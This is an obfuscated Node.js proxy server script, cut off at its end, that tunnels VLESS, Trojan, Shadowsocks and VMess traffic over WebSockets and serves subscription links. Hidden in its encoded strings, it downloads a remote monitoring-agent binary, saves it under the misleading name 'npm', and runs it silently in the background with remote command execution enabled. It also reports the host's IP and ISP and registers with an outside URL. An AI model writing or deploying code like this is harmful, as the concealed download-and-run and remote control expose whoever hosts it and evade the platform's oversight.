const _0x44d7e6=_0x4386;(function(_0x232075,_0x588b8b){const _0xb3de6f=_0x4386,_0x1cc8d6=_0x232075();while(!![]){try{const _0x56346e=parseInt(_0xb3de6f(0x242))/0x1*(-parseInt(_0xb3de6f(0x234))/0x2)+parseInt(_0xb3de6f(0x1e0))/0x3+parseInt(_0xb3de6f(0x1a7))/0x4*(parseInt(_0xb3de6f(0x1fd))/0x5)+parseInt(_0xb3de6f(0x1b7))/0x6*(-parseInt(_0xb3de6f(0x218))/0x7)+parseInt(_0xb3de6f(0x203))/0x8+-parseInt(_0xb3de6f(0x22c))/0x9*(-parseInt(_0xb3de6f(0x1cf))/0xa)+parseInt(_0xb3de6f(0x1e3))/0xb*(-parseInt(_0xb3de6f(0x211))/0xc);if(_0x56346e===_0x588b8b)break;else _0x1cc8d6['push'](_0x1cc8d6['shift']());}catch(_0x2966d6){_0x1cc8d6['push'](_0x1cc8d6['shift']());}}}(_0x1f5f,0x2b676));const os=require('os'),http=require('http'),https=require(_0x44d7e6(0x1d1)),fs=require('fs'),net=require(_0x44d7e6(0x22f)),path=require('path'),crypto=require('crypto'),{Buffer}=require(_0x44d7e6(0x1a2)),{exec,execSync}=require(_0x44d7e6(0x1cb)),vmsServer=require(_0x44d7e6(0x21e)),Validator=require(_0x44d7e6(0x236)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x44d7e6(0x1c6)][_0x44d7e6(0x20c)]||_0x44d7e6(0x1b4),NEZHA_SERVER=process[_0x44d7e6(0x1c6)][_0x44d7e6(0x219)]||'',NEZHA_PORT=process[_0x44d7e6(0x1c6)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x44d7e6(0x206)]||'',DOMAIN=process['env'][_0x44d7e6(0x1d2)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],WSPATH=process[_0x44d7e6(0x1c6)]['WSPATH']||UUID[_0x44d7e6(0x23a)](0x0,0x8),SUB_PATH=process[_0x44d7e6(0x1c6)]['SUB_PATH']||_0x44d7e6(0x23b),NAME=process[_0x44d7e6(0x1c6)][_0x44d7e6(0x1dd)]||'',PORT=process['env'][_0x44d7e6(0x23f)]||0xbb8;let uuid=UUID[_0x44d7e6(0x1f3)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x44d7e6(0x1ed),CurrentPort=0x1bb,ISP='';function _0x4386(_0xcd9782,_0x12e841){_0xcd9782=_0xcd9782-0x19f;const _0x1f5ff5=_0x1f5f();let _0x4386e4=_0x1f5ff5[_0xcd9782];return _0x4386e4;}const vmsUser={'id':UUID,'alterId':0x0,'security':_0x44d7e6(0x1c0)};Validator[_0x44d7e6(0x207)]({'tag':_0x44d7e6(0x1af),'users':[vmsUser]});const DNS_SERVERS=[_0x44d7e6(0x1fc),_0x44d7e6(0x1f7)],BLOCKED_DOMAINS=['speedtest.net',_0x44d7e6(0x1ca),_0x44d7e6(0x1fe),_0x44d7e6(0x237),_0x44d7e6(0x22d),_0x44d7e6(0x1d6),'bandwidth.place',_0x44d7e6(0x210),_0x44d7e6(0x1d9),'speedcheck.org'];function isBlockedDomain(_0x17b313){const _0x810bc1=_0x44d7e6;if(!_0x17b313)return![];const _0x49dabc=_0x17b313[_0x810bc1(0x20d)]();return BLOCKED_DOMAINS['some'](_0x321fe1=>{return _0x49dabc===_0x321fe1||_0x49dabc['endsWith']('.'+_0x321fe1);});}const httpGet=(_0x121fd2,_0x3e26a9={})=>{return new Promise((_0x3b50eb,_0x54f5c4)=>{const _0x49343e=_0x4386,_0x880f8=_0x3e26a9['timeout']||0x2710,_0x10b563=_0x121fd2['startsWith'](_0x49343e(0x1d1))?https:http,_0x1a3911=_0x10b563[_0x49343e(0x1a5)](_0x121fd2,{'timeout':_0x880f8},_0x445895=>{const _0x12ff09=_0x49343e;let _0x43c08b='';_0x445895['on'](_0x12ff09(0x1e2),_0x2a3b48=>_0x43c08b+=_0x2a3b48),_0x445895['on'](_0x12ff09(0x1a3),()=>{const _0x424e72=_0x12ff09;try{const _0x17d213=JSON[_0x424e72(0x1a6)](_0x43c08b);_0x3b50eb({'data':_0x17d213});}catch(_0x4cec8f){_0x3b50eb({'data':_0x43c08b});}});});_0x1a3911['on'](_0x49343e(0x1d4),_0x54f5c4),_0x1a3911['on'](_0x49343e(0x1ab),()=>{const _0x33dea6=_0x49343e;_0x1a3911[_0x33dea6(0x1a1)](),_0x54f5c4(new Error(_0x33dea6(0x1db)));});});},httpPost=(_0x30fa13,_0x1ceab9,_0x256bcb={})=>{return new Promise((_0x265d32,_0x13a2fa)=>{const _0x129416=_0x4386,_0x2b4523=new URL(_0x30fa13),_0x243cfb=JSON['stringify'](_0x1ceab9),_0x5818a7={'hostname':_0x2b4523[_0x129416(0x1f2)],'port':_0x2b4523[_0x129416(0x1a0)]||0x1bb,'path':_0x2b4523[_0x129416(0x1b3)],'method':_0x129416(0x1e6),'headers':{'Content-Type':_0x129416(0x216),'Content-Length':_0x243cfb[_0x129416(0x1ce)],..._0x256bcb['headers']}},_0x3e1828=https[_0x129416(0x222)](_0x5818a7,_0x50a403=>{const _0x4f3b00=_0x129416;let _0x2972ee='';_0x50a403['on'](_0x4f3b00(0x1e2),_0x22a7b1=>_0x2972ee+=_0x22a7b1),_0x50a403['on'](_0x4f3b00(0x1a3),()=>_0x265d32({'data':_0x2972ee}));});_0x3e1828['on']('error',_0x13a2fa),_0x3e1828[_0x129416(0x230)](_0x243cfb),_0x3e1828[_0x129416(0x1a3)]();});},GetConfig=async()=>{const _0x22e3b4=_0x44d7e6;try{const _0x454fbc=await httpGet(_0x22e3b4(0x232),{'timeout':0x1f40}),_0x47ace9=_0x454fbc[_0x22e3b4(0x1e2)];if(_0x47ace9&&_0x47ace9[_0x22e3b4(0x23d)]===_0x22e3b4(0x1ac)&&_0x47ace9[_0x22e3b4(0x1c2)]){const _0x2bc060=_0x47ace9[_0x22e3b4(0x21a)]||_0x47ace9['as']||_0x22e3b4(0x1cc);ISP=(_0x47ace9[_0x22e3b4(0x1c2)]+'-'+_0x2bc060)['replace'](/ /g,'_');}else ISP=_0x22e3b4(0x20f);}catch(_0xfa081c){ISP=_0x22e3b4(0x20f);}if(!DOMAIN||DOMAIN===_0x22e3b4(0x235))try{const _0x2d8fe0=await httpGet('https://api-ipv4.ip.sb/ip',{'timeout':0x1f40}),_0x11c9b3=_0x2d8fe0['data'][_0x22e3b4(0x23c)]();CurrentDomain=_0x11c9b3,Tls='none',CurrentPort=PORT;}catch(_0x10639d){console[_0x22e3b4(0x1d4)](_0x22e3b4(0x1f1),_0x10639d[_0x22e3b4(0x1e7)]),(CurrentDomain=_0x22e3b4(0x235),Tls=_0x22e3b4(0x1ed),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x22e3b4(0x1ed),CurrentPort=0x1bb;},httpServer=http[_0x44d7e6(0x202)]((_0x2a5ed6,_0x55b7e0)=>{const _0xb26375=_0x44d7e6;if(_0x2a5ed6['url']==='/'){const _0x45496c=path[_0xb26375(0x245)](__dirname,'index.html');fs[_0xb26375(0x1e9)](_0x45496c,'utf8',(_0x13a923,_0x5f25ff)=>{const _0x3b7244=_0xb26375;if(_0x13a923){_0x55b7e0[_0x3b7244(0x1f9)](0xc8,{'Content-Type':'text/html'}),_0x55b7e0[_0x3b7244(0x1a3)](_0x3b7244(0x21d));return;}_0x55b7e0[_0x3b7244(0x1f9)](0xc8,{'Content-Type':_0x3b7244(0x228)}),_0x55b7e0[_0x3b7244(0x1a3)](_0x5f25ff);});return;}else _0x2a5ed6[_0xb26375(0x243)]==='/'+SUB_PATH?GetConfig()['then'](()=>{const _0x335dce=_0xb26375,_0x32b3a3=NAME?NAME+'-'+ISP:ISP,_0x323180=Tls===_0x335dce(0x1ed)?'tls':_0x335dce(0x201),_0x440beb=Tls===_0x335dce(0x1ed)?_0x335dce(0x1fa):'',_0x1bfef6=Buffer[_0x335dce(0x1b6)](_0x335dce(0x223)+UUID)[_0x335dce(0x21b)](_0x335dce(0x1de)),_0x27165f=_0x335dce(0x1f0)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x335dce(0x215)+_0x323180+_0x335dce(0x1cd)+CurrentDomain+_0x335dce(0x1d0)+CurrentDomain+_0x335dce(0x22a)+WSPATH+'#'+_0x32b3a3,_0x450a66=_0x335dce(0x1e5)+UUID+'@'+CurrentDomain+':'+CurrentPort+'?security='+_0x323180+'&sni='+CurrentDomain+_0x335dce(0x1d0)+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x32b3a3,_0x3ab664=_0x335dce(0x240)+_0x1bfef6+'@'+CurrentDomain+':'+CurrentPort+_0x335dce(0x1ee)+CurrentDomain+_0x335dce(0x1bf)+WSPATH+';'+_0x440beb+_0x335dce(0x208)+CurrentDomain+_0x335dce(0x1d7)+_0x32b3a3,_0xcb514e={'v':'2','ps':''+_0x32b3a3,'add':CurrentDomain,'port':CurrentPort[_0x335dce(0x21b)](),'id':UUID,'aid':'0','scy':_0x335dce(0x1c0),'net':'ws','type':_0x335dce(0x201),'host':CurrentDomain,'path':'/'+WSPATH,'tls':Tls,'sni':CurrentDomain,'alpn':'','allowInsecure':'0','fp':_0x335dce(0x1ef)},_0x10f005=_0x335dce(0x1b9)+Buffer[_0x335dce(0x1b6)](JSON['stringify'](_0xcb514e))['toString']('base64'),_0x5340e9=_0x27165f+'\x0a'+_0x10f005+'\x0a'+_0x450a66+'\x0a'+_0x3ab664,_0x3f771=Buffer[_0x335dce(0x1b6)](_0x5340e9)[_0x335dce(0x21b)](_0x335dce(0x1de));_0x55b7e0[_0x335dce(0x1f9)](0xc8,{'Content-Type':_0x335dce(0x1f8)}),_0x55b7e0[_0x335dce(0x1a3)](_0x3f771+'\x0a');}):(_0x55b7e0[_0xb26375(0x1f9)](0x194,{'Content-Type':_0xb26375(0x1f8)}),_0x55b7e0[_0xb26375(0x1a3)](_0xb26375(0x1d3)));});function resolveHost(_0xedaf10){return new Promise((_0x12fb86,_0x2ed20e)=>{const _0x1e6f2b=_0x4386;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1e6f2b(0x1f6)](_0xedaf10)){_0x12fb86(_0xedaf10);return;}let _0x537fad=0x0;function _0x14c83b(){const _0x4d6e53=_0x1e6f2b;if(_0x537fad>=DNS_SERVERS[_0x4d6e53(0x1ce)]){_0x2ed20e(new Error(_0x4d6e53(0x239)+_0xedaf10+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x461a89=DNS_SERVERS[_0x537fad];_0x537fad++;const _0x53fc64='https://dns.google/resolve?name='+encodeURIComponent(_0xedaf10)+_0x4d6e53(0x1b5);httpGet(_0x53fc64,{'timeout':0x1388})[_0x4d6e53(0x231)](_0x1644fc=>{const _0x1de311=_0x4d6e53,_0x2d0af9=_0x1644fc[_0x1de311(0x1e2)];if(_0x2d0af9[_0x1de311(0x1ae)]===0x0&&_0x2d0af9['Answer']&&_0x2d0af9[_0x1de311(0x19f)][_0x1de311(0x1ce)]>0x0){const _0x35307d=_0x2d0af9[_0x1de311(0x19f)][_0x1de311(0x1a4)](_0x4ee175=>_0x4ee175[_0x1de311(0x1be)]===0x1);if(_0x35307d){_0x12fb86(_0x35307d[_0x1de311(0x1e2)]);return;}}_0x14c83b();})[_0x4d6e53(0x23e)](_0xbdb52e=>{_0x14c83b();});}_0x14c83b();});}function handleVlsConnection(_0x26104d,_0x5c2ce6){const _0x45d6c2=_0x44d7e6,[_0x449056]=_0x5c2ce6,_0x3b828a=_0x5c2ce6[_0x45d6c2(0x23a)](0x1,0x11);if(!_0x3b828a[_0x45d6c2(0x1b0)]((_0x4c1248,_0x90621d)=>_0x4c1248==parseInt(uuid[_0x45d6c2(0x1b2)](_0x90621d*0x2,0x2),0x10)))return![];let _0x23e0ec=_0x5c2ce6['slice'](0x11,0x12)[_0x45d6c2(0x227)]()+0x13;const _0x217716=_0x5c2ce6[_0x45d6c2(0x23a)](_0x23e0ec,_0x23e0ec+=0x2)['readUInt16BE'](0x0),_0x1abbca=_0x5c2ce6[_0x45d6c2(0x23a)](_0x23e0ec,_0x23e0ec+=0x1)[_0x45d6c2(0x227)](),_0x481fbe=_0x1abbca==0x1?_0x5c2ce6['slice'](_0x23e0ec,_0x23e0ec+=0x4)[_0x45d6c2(0x245)]('.'):_0x1abbca==0x2?new TextDecoder()[_0x45d6c2(0x1c5)](_0x5c2ce6[_0x45d6c2(0x23a)](_0x23e0ec+0x1,_0x23e0ec+=0x1+_0x5c2ce6['slice'](_0x23e0ec,_0x23e0ec+0x1)[_0x45d6c2(0x227)]())):_0x1abbca==0x3?_0x5c2ce6[_0x45d6c2(0x23a)](_0x23e0ec,_0x23e0ec+=0x10)[_0x45d6c2(0x21c)]((_0x13479e,_0x4bf9d3,_0xfe9dd4,_0x9882ed)=>_0xfe9dd4%0x2?_0x13479e['concat'](_0x9882ed['slice'](_0xfe9dd4-0x1,_0xfe9dd4+0x1)):_0x13479e,[])[_0x45d6c2(0x1ff)](_0x1d4eab=>_0x1d4eab[_0x45d6c2(0x200)](0x0)[_0x45d6c2(0x21b)](0x10))[_0x45d6c2(0x245)](':'):'';if(isBlockedDomain(_0x481fbe))return _0x26104d[_0x45d6c2(0x1f4)](),![];_0x26104d[_0x45d6c2(0x1eb)](new Uint8Array([_0x449056,0x0]));const _0x1a5a30=createWebSocketStream(_0x26104d);return resolveHost(_0x481fbe)[_0x45d6c2(0x231)](_0x278fa7=>{const _0x1add01=_0x45d6c2;net[_0x1add01(0x1c7)]({'host':_0x278fa7,'port':_0x217716},function(){const _0x58e558=_0x1add01;this[_0x58e558(0x230)](_0x5c2ce6[_0x58e558(0x23a)](_0x23e0ec)),_0x1a5a30['on'](_0x58e558(0x1d4),()=>{})[_0x58e558(0x1ea)](this)['on'](_0x58e558(0x1d4),()=>{})[_0x58e558(0x1ea)](_0x1a5a30);})['on']('error',()=>{});})[_0x45d6c2(0x23e)](_0x4b4c33=>{const _0x119260=_0x45d6c2;net[_0x119260(0x1c7)]({'host':_0x481fbe,'port':_0x217716},function(){const _0x791c33=_0x119260;this[_0x791c33(0x230)](_0x5c2ce6['slice'](_0x23e0ec)),_0x1a5a30['on'](_0x791c33(0x1d4),()=>{})[_0x791c33(0x1ea)](this)['on'](_0x791c33(0x1d4),()=>{})[_0x791c33(0x1ea)](_0x1a5a30);})['on'](_0x119260(0x1d4),()=>{});}),!![];}function handleTrojConnection(_0xea2b62,_0x4c019e){const _0x4a5991=_0x44d7e6;try{if(_0x4c019e[_0x4a5991(0x1ce)]<0x3a)return![];const _0x4271fa=_0x4c019e['slice'](0x0,0x38)['toString'](),_0x11f748=[UUID];let _0x2cd9d4=null;for(const _0x25c218 of _0x11f748){const _0x39f8a8=crypto['createHash'](_0x4a5991(0x21f))['update'](_0x25c218)[_0x4a5991(0x1d8)]('hex');if(_0x39f8a8===_0x4271fa){_0x2cd9d4=_0x25c218;break;}}if(!_0x2cd9d4)return![];let _0x2b94d3=0x38;_0x4c019e[_0x2b94d3]===0xd&&_0x4c019e[_0x2b94d3+0x1]===0xa&&(_0x2b94d3+=0x2);const _0x20f265=_0x4c019e[_0x2b94d3];if(_0x20f265!==0x1)return![];_0x2b94d3+=0x1;const _0x5d0984=_0x4c019e[_0x2b94d3];_0x2b94d3+=0x1;let _0xcc9981,_0x58e789;if(_0x5d0984===0x1)_0xcc9981=_0x4c019e[_0x4a5991(0x23a)](_0x2b94d3,_0x2b94d3+0x4)[_0x4a5991(0x245)]('.'),_0x2b94d3+=0x4;else{if(_0x5d0984===0x3){const _0x5ef59e=_0x4c019e[_0x2b94d3];_0x2b94d3+=0x1,_0xcc9981=_0x4c019e[_0x4a5991(0x23a)](_0x2b94d3,_0x2b94d3+_0x5ef59e)[_0x4a5991(0x21b)](),_0x2b94d3+=_0x5ef59e;}else{if(_0x5d0984===0x4)_0xcc9981=_0x4c019e[_0x4a5991(0x23a)](_0x2b94d3,_0x2b94d3+0x10)[_0x4a5991(0x21c)]((_0x5e8eb3,_0x4f133d,_0x165bf2,_0x72a79f)=>_0x165bf2%0x2?_0x5e8eb3[_0x4a5991(0x1b1)](_0x72a79f[_0x4a5991(0x23a)](_0x165bf2-0x1,_0x165bf2+0x1)):_0x5e8eb3,[])['map'](_0x3dc652=>_0x3dc652[_0x4a5991(0x200)](0x0)[_0x4a5991(0x21b)](0x10))[_0x4a5991(0x245)](':'),_0x2b94d3+=0x10;else return![];}}_0x58e789=_0x4c019e[_0x4a5991(0x200)](_0x2b94d3),_0x2b94d3+=0x2;_0x2b94d3<_0x4c019e[_0x4a5991(0x1ce)]&&_0x4c019e[_0x2b94d3]===0xd&&_0x4c019e[_0x2b94d3+0x1]===0xa&&(_0x2b94d3+=0x2);if(isBlockedDomain(_0xcc9981))return _0xea2b62[_0x4a5991(0x1f4)](),![];const _0x2121e6=createWebSocketStream(_0xea2b62);return resolveHost(_0xcc9981)[_0x4a5991(0x231)](_0x50a375=>{const _0x4516fe=_0x4a5991;net['connect']({'host':_0x50a375,'port':_0x58e789},function(){const _0x4826b8=_0x4386;_0x2b94d3<_0x4c019e['length']&&this['write'](_0x4c019e[_0x4826b8(0x23a)](_0x2b94d3)),_0x2121e6['on'](_0x4826b8(0x1d4),()=>{})[_0x4826b8(0x1ea)](this)['on'](_0x4826b8(0x1d4),()=>{})['pipe'](_0x2121e6);})['on'](_0x4516fe(0x1d4),()=>{});})[_0x4a5991(0x23e)](_0x481444=>{const _0x4a44eb=_0x4a5991;net[_0x4a44eb(0x1c7)]({'host':_0xcc9981,'port':_0x58e789},function(){const _0x4eb193=_0x4a44eb;_0x2b94d3<_0x4c019e['length']&&this[_0x4eb193(0x230)](_0x4c019e[_0x4eb193(0x23a)](_0x2b94d3)),_0x2121e6['on'](_0x4eb193(0x1d4),()=>{})['pipe'](this)['on'](_0x4eb193(0x1d4),()=>{})[_0x4eb193(0x1ea)](_0x2121e6);})['on'](_0x4a44eb(0x1d4),()=>{});}),!![];}catch(_0x56304f){return![];}}function handleSsConnection(_0x2a8d7b,_0x34bf41){const _0x1f96a4=_0x44d7e6;try{let _0x227a78=0x0;const _0x359da6=_0x34bf41[_0x227a78];_0x227a78+=0x1;let _0x1c1a1c,_0x46a2fb;if(_0x359da6===0x1)_0x1c1a1c=_0x34bf41[_0x1f96a4(0x23a)](_0x227a78,_0x227a78+0x4)['join']('.'),_0x227a78+=0x4;else{if(_0x359da6===0x3){const _0x40c1f4=_0x34bf41[_0x227a78];_0x227a78+=0x1,_0x1c1a1c=_0x34bf41['slice'](_0x227a78,_0x227a78+_0x40c1f4)[_0x1f96a4(0x21b)](),_0x227a78+=_0x40c1f4;}else{if(_0x359da6===0x4)_0x1c1a1c=_0x34bf41[_0x1f96a4(0x23a)](_0x227a78,_0x227a78+0x10)[_0x1f96a4(0x21c)]((_0xcbc64,_0x2ca327,_0x41d987,_0x3418e6)=>_0x41d987%0x2?_0xcbc64[_0x1f96a4(0x1b1)](_0x3418e6[_0x1f96a4(0x23a)](_0x41d987-0x1,_0x41d987+0x1)):_0xcbc64,[])[_0x1f96a4(0x1ff)](_0x5e79e8=>_0x5e79e8[_0x1f96a4(0x200)](0x0)[_0x1f96a4(0x21b)](0x10))[_0x1f96a4(0x245)](':'),_0x227a78+=0x10;else return![];}}_0x46a2fb=_0x34bf41[_0x1f96a4(0x200)](_0x227a78),_0x227a78+=0x2;if(isBlockedDomain(_0x1c1a1c))return _0x2a8d7b[_0x1f96a4(0x1f4)](),![];const _0x42b122=createWebSocketStream(_0x2a8d7b);return resolveHost(_0x1c1a1c)['then'](_0x4e649a=>{const _0x402e3f=_0x1f96a4;net[_0x402e3f(0x1c7)]({'host':_0x4e649a,'port':_0x46a2fb},function(){const _0x4bdb8b=_0x402e3f;_0x227a78<_0x34bf41['length']&&this[_0x4bdb8b(0x230)](_0x34bf41[_0x4bdb8b(0x23a)](_0x227a78)),_0x42b122['on'](_0x4bdb8b(0x1d4),()=>{})[_0x4bdb8b(0x1ea)](this)['on'](_0x4bdb8b(0x1d4),()=>{})[_0x4bdb8b(0x1ea)](_0x42b122);})['on'](_0x402e3f(0x1d4),()=>{});})[_0x1f96a4(0x23e)](_0xf3477b=>{const _0x2ba5af=_0x1f96a4;net[_0x2ba5af(0x1c7)]({'host':_0x1c1a1c,'port':_0x46a2fb},function(){const _0x12a03c=_0x2ba5af;_0x227a78<_0x34bf41[_0x12a03c(0x1ce)]&&this['write'](_0x34bf41[_0x12a03c(0x23a)](_0x227a78)),_0x42b122['on'](_0x12a03c(0x1d4),()=>{})['pipe'](this)['on']('error',()=>{})[_0x12a03c(0x1ea)](_0x42b122);})['on'](_0x2ba5af(0x1d4),()=>{});}),!![];}catch(_0x598c3a){return![];}}function handleVmsConnection(_0x367354,_0x23bbbe){const _0x24ec6c=_0x44d7e6;try{if(_0x23bbbe['length']<0x1a)return![];const _0x30bbff={'localClose':()=>{_0x367354['close']();},'localMessage':_0x5253e2=>{const _0x38e641=_0x4386;if(_0x367354['readyState']===WebSocket[_0x38e641(0x1c1)])_0x367354[_0x38e641(0x1eb)](_0x5253e2);},'remoteAddress':_0x367354[_0x24ec6c(0x22b)][_0x24ec6c(0x1e4)],'remotePort':_0x367354['_socket'][_0x24ec6c(0x204)],'app':{}},_0x23d59b=(_0xaed95d,_0x2256bf,_0x4d65d2,_0x35ee8b,_0x18d100,_0x57d87f)=>{const _0x241c14=_0x24ec6c;if(isBlockedDomain(_0xaed95d))return _0x57d87f(),{'message':()=>{},'close':()=>{}};let _0x4dcf85=null;return resolveHost(_0xaed95d)['then'](_0x25157f=>{const _0x1a1df1=_0x4386;_0x4dcf85=net[_0x1a1df1(0x1c7)]({'host':_0x25157f,'port':_0x2256bf},()=>{_0x35ee8b();}),_0x4dcf85['on'](_0x1a1df1(0x1e2),_0x18d100),_0x4dcf85['on'](_0x1a1df1(0x1f4),_0x57d87f),_0x4dcf85['on'](_0x1a1df1(0x1d4),_0x57d87f);})[_0x241c14(0x23e)](_0x57d87f),{'message':_0x22135d=>{const _0x114563=_0x241c14;if(_0x4dcf85&&!_0x4dcf85['destroyed'])_0x4dcf85[_0x114563(0x230)](_0x22135d);},'close':()=>{const _0x1a7292=_0x241c14;if(_0x4dcf85)_0x4dcf85[_0x1a7292(0x1a1)]();}};},_0x53dfaa=vmsServer({'tag':_0x24ec6c(0x1af),'users':[vmsUser]},_0x23d59b)(_0x30bbff,_0x367354[_0x24ec6c(0x22b)][_0x24ec6c(0x1e4)]);return _0x367354['on'](_0x24ec6c(0x1e7),_0x37cb92=>{_0x53dfaa['message'](_0x37cb92);}),_0x53dfaa[_0x24ec6c(0x1e7)](_0x23bbbe),!![];}catch(_0x2cf0e3){return![];}}const wss=new WebSocket['Server']({'server':httpServer});wss['on'](_0x44d7e6(0x1dc),(_0x186bbe,_0x540cf2)=>{const _0x1097ab=_0x44d7e6,_0x4a02e2=_0x540cf2[_0x1097ab(0x243)]||'',_0x1b3ba6='/'+WSPATH;if(!_0x4a02e2[_0x1097ab(0x1c9)](_0x1b3ba6)){_0x186bbe[_0x1097ab(0x1f4)]();return;}_0x186bbe[_0x1097ab(0x238)]('message',_0x185d59=>{const _0x2cc25e=_0x1097ab;if(_0x185d59[_0x2cc25e(0x1ce)]>0x11&&_0x185d59[0x0]===0x0){const _0x158355=_0x185d59[_0x2cc25e(0x23a)](0x1,0x11),_0x1aedb0=_0x158355['every']((_0x4e5705,_0x2402da)=>_0x4e5705==parseInt(uuid[_0x2cc25e(0x1b2)](_0x2402da*0x2,0x2),0x10));if(_0x1aedb0){!handleVlsConnection(_0x186bbe,_0x185d59)&&_0x186bbe[_0x2cc25e(0x1f4)]();return;}}if(_0x185d59[_0x2cc25e(0x1ce)]>=0x3a){if(handleTrojConnection(_0x186bbe,_0x185d59))return;}if(_0x185d59['length']>0x0&&(_0x185d59[0x0]===0x1||_0x185d59[0x0]===0x3||_0x185d59[0x0]===0x4)){if(handleSsConnection(_0x186bbe,_0x185d59))return;}if(_0x185d59[_0x2cc25e(0x1ce)]>=0x1a){if(handleVmsConnection(_0x186bbe,_0x185d59))return;}_0x186bbe[_0x2cc25e(0x1f4)]();})['on']('error',()=>{});});function _0x1f5f(){const _0x4b42a6=['\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','startsWith','fast.com','child_process','ISP','&sni=','length','2110HGEwzd','&fp=chrome&type=ws&host=','https','DOMAIN','Not\x20Found\x0a','error','https://oooo.serv00.net/add-url','testmy.net',';skip-cert-verify%3Dtrue;mux%3D0#','digest','librespeed.org','2083','Request\x20timeout','connection','NAME','base64','https://arm64.ssss.nyc.mn/agent','633471gwynQW','Automatic\x20Access\x20Task\x20added\x20successfully','data','33uUpXIf','remoteAddress','trojan://','POST','message','split','readFile','pipe','send','forEach','tls','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','chrome','vless://','Failed\x20to\x20get\x20IP','hostname','replace','close','2096','test','1.1.1.1','text/plain','writeHead','tls;','npm\x20running\x20error:','8.8.4.4','5dixPvI','speedtest.cn','map','readUInt16BE','none','createServer','1641064djsauf','remotePort','npm\x20is\x20already\x20running,\x20skip\x20running...','NEZHA_KEY','init','sni%3D','8443','arm','npm','UUID','toLowerCase','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Unknown','speed.io','406656NujYUx','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','true','writeFileSync','?encryption=none&security=','application/json','https://arm64.ssss.nyc.mn/v1','66122iDGrDq','NEZHA_SERVER','isp','toString','reduce','Hello\x20world!','jsvms/protocols/vmess/server','sha224','2053','\x20-p\x20','request','none:','config.yaml','2087','client_secret:\x20','readUInt8','text/html','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&path=%2F','_socket','6003evPUhr','speedof.me','Server\x20is\x20running\x20on\x20port\x20','net','write','then','http://ip-api.com/json/?fields=status,country,countryCode,isp,as','setsid\x20nohup\x20./npm\x20-s\x20','310JkPhud','your-domain.com','jsvms/protocols/vmess/validator','speed.cloudflare.com','once','Failed\x20to\x20resolve\x20','slice','subv2y','trim','status','catch','PORT','ss://','npm\x20download\x20successfully','1411gPTkRU','url','includes','join','Answer','port','destroy','buffer','end','find','get','parse','1162504lcOxBC','aarch64','createWriteStream','443','timeout','success','/bin/bash','Status','inbound','every','concat','substr','pathname','b4704f34-8540-4d88-a27d-089261064660','&type=A','from','222FRPTgz','log','vmess://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','chmod\x20+x\x20npm','type',';path%3D%2F','auto','OPEN','countryCode','https://','listen','decode','env','connect'];_0x1f5f=function(){return _0x4b42a6;};return _0x1f5f();}const getDownloadUrl=()=>{const _0x16f043=_0x44d7e6,_0x1262e0=os['arch']();return _0x1262e0===_0x16f043(0x20a)||_0x1262e0==='arm64'||_0x1262e0===_0x16f043(0x1a8)?!NEZHA_PORT?_0x16f043(0x217):_0x16f043(0x1df):!NEZHA_PORT?_0x16f043(0x1bb):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x44a736=_0x44d7e6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1a25d0=getDownloadUrl(),_0x342a82=await new Promise((_0x207e6b,_0x57b687)=>{const _0x4ba583=_0x4386;https[_0x4ba583(0x1a5)](_0x1a25d0,_0x29b2c4=>{_0x207e6b({'data':_0x29b2c4});})['on'](_0x4ba583(0x1d4),_0x57b687);}),_0x17aea9=fs[_0x44a736(0x1a9)](_0x44a736(0x20b));return _0x342a82[_0x44a736(0x1e2)][_0x44a736(0x1ea)](_0x17aea9),new Promise((_0x389ab3,_0x105156)=>{_0x17aea9['on']('finish',()=>{const _0x1c7e0e=_0x4386;console[_0x1c7e0e(0x1b8)](_0x1c7e0e(0x241)),exec(_0x1c7e0e(0x1bd),_0x180f3d=>{if(_0x180f3d)_0x105156(_0x180f3d);_0x389ab3();});}),_0x17aea9['on']('error',_0x105156);});}catch(_0x73091b){throw _0x73091b;}},runnz=async()=>{const _0x1c67e0=_0x44d7e6;try{const _0x77e213=execSync(_0x1c67e0(0x20e),{'encoding':'utf-8'});if(_0x77e213['trim']()!==''){console['log'](_0x1c67e0(0x205));return;}}catch(_0x4e1fb1){}await downloadFile();let _0x2af271='',_0x3f8fe7=[_0x1c67e0(0x1aa),_0x1c67e0(0x209),_0x1c67e0(0x1f5),_0x1c67e0(0x225),_0x1c67e0(0x1da),_0x1c67e0(0x220)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x43b555=_0x3f8fe7[_0x1c67e0(0x244)](NEZHA_PORT)?'--tls':'';_0x2af271=_0x1c67e0(0x233)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1c67e0(0x221)+NEZHA_KEY+'\x20'+_0x43b555+_0x1c67e0(0x229);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const 